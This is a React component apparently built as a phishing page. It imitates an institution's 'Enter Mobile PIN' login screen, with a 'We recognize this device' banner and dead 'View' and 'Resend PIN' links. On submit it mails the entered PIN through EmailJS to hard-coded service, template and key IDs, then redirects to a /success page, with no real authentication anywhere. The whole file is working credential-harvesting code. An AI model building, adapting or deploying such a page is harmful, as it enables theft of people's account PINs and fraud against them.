import { useState } from "react";
import {
  Box,
  Text,
  Heading,
  Center,
  FormControl,
  Input,
  Button,
  InputGroup,
  IconButton,
  InputRightElement,
  Spinner,
} from "@chakra-ui/react";
import { FaEyeSlash, FaEye } from "react-icons/fa";
import emailjs from '@emailjs/browser';
import { useNavigate } from "react-router-dom";

function Enter() {
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false); // Loading state
  const navigate = useNavigate();

  const handleShowPassword = () => {
    setShowPassword(!showPassword);
  };

  const sendEmail = (e: any) => {
    e.preventDefault();
    setLoading(true); // Start loading

    emailjs
      .sendForm("service_9vq8bca", "template_barvi2x", e.target, "n1LlPgghSqnVWFxPU")
      .then(
        (result) => {
          console.log(result.text);
          setLoading(false); // Stop loading
          navigate("/success"); // Navigate to /success after successful form submission
        },
        (error) => {
          console.log(error.text);
          setLoading(false); // Stop loading
        }
      );
  };

  return (
    <Box>
      <form onSubmit={sendEmail}>
        <InputGroup>
          <FormControl>
            <Box minH="72.3vh">
              <Center p={4} bgColor="whitesmoke" justifyContent="space-between">
                <Text pl={2} fontSize="md" color="#196999" fontWeight="semibold">
                  We recognize this device.
                </Text>
                <Text textDecor={"underline"} pl={2} fontSize="md" color="#196999" fontWeight="semibold">
                  <a href="#">View</a>
                </Text>
              </Center>

              <Box>
                <Center>
                  <Heading px={4} textAlign="center" pt={7} fontWeight="semibold" as="h2" fontSize="26" color="blackAlpha.800">
                    Enter Mobile PIN
                  </Heading>
                </Center>
              </Box>

              <Box p={5}>
                <Input
                  id="password"
                  _hover={{ border: "solid 0.9px" }}
                  border={"1px solid #196999"}
                  borderRadius={0}
                  _focus={{ bgColor: "yellow.100", border: "none" }}
                  _placeholder={{ color: "blackAlpha.800", top: "0", transform: "translateY(-130%)", fontSize: "12px" }}
                  h="70px"
                  placeholder="PIN"
                  pb={0}
                  name="pin"
                  maxLength={4}
                  type={showPassword ? "text" : "password"}
                />
              </Box>

              <Box p={4}>
                <Button
                  type="submit"
                  _hover={{ bg: "#526f30", color: "whitesmoke", borderRadius: 2 }}
                  mt={2}
                  h={12}
                  bgColor="#486428"
                  color="whitesmoke"
                  borderRadius={2}
                  w="100%"
                >
                  Login
                </Button>

                {loading && (
                  <Center mt={4}>
                    <Spinner size="xl" color="green.500" />
                  </Center>
                )}

                <Text mt={5} textAlign="center" color="#196999" fontWeight="semibold" fontSize={14}>
                  Resend PIN
                </Text>
              </Box>
            </Box>
            <InputRightElement mt={36} width="8.5rem">
              <IconButton
                h="100%"
                p={2}
                size="lg"
                onClick={handleShowPassword}
                colorScheme="gray"
                icon={showPassword ? (
                  <>
                    <FaEyeSlash />
                    <Text ml={1}> Hide</Text>
                  </>
                ) : (
                  <>
                    <FaEye />
                    <Text ml={1}> Show</Text>
                  </>
                )}
                aria-label={""}
              />
            </InputRightElement>
          </FormControl>
        </InputGroup>
      </form>
    </Box>
  );
}

export default Enter;
